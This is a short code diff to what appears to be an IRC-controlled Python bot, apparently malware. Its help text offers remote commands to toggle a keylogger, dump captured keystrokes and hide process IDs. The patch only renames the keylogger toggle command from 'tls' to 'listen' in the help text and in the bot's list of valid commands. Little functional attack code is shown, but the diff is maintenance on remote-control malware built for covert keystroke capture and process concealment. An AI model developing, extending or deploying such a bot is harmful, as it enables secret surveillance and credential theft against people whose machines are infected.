@@ -17,7 +17,7 @@ Bot commands are:
     	die -- Kill the bot.
 
     ROOT COMMANDS -------
-    	tls -- Toggle keylogger listening on/off. 
+    	listen -- Toggle keylogger listening on/off. 
     	keylog -- Print keyboard input log. 
                   Keylogger is turned off.
     	hpXXXX -- Hide a process id.
@@ -51,7 +51,7 @@ class Bot(irc.bot.SingleServerIRCBot):
 	def __init__(self, channel, nickname, server, port=6667):
         	irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname, reconnection_interval=15)
         	self.channel = channel
-    		self.valid_cmds = ["sp", "tls", "thf", "mh", "ms"] 
+    		self.valid_cmds = ["sp", "listen", "thf", "mh", "ms"] 
 
 	def on_nicknameinuse(self, c, e):
 		if debug:
@@ -171,7 +171,7 @@ stats -- Print some channel information.
 disconnect -- Disconnect the bot from a DCC session. The bot will try to reconnect after 15 seconds.
 die -- Kill the bot.
 ROOT COMMANDS -------
-tls -- Toggle keylogger listening on/off. 
+listen -- Toggle keylogger listening on/off. 
 keylog -- Print keyboard input log. Keylogger is turned off.
 hpxxxx -- Hide a process id.
 sp -- Show the last hidden process.
